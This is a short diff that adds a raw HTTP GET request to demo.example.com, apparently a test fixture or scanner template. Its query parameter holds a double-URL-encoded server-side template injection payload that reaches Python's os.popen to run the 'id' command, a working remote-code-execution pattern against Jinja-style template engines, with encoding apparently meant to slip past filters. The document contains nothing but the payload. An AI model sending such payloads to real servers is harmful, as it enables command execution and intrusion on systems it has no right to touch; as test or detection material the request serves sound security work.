@@ -1,0 +1,4 @@
+GET /a?name=%257B%257Bnamespace.__init__.__globals__.os.popen%2528%2527id%2527%2529.read%2528%2529%257D%257D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
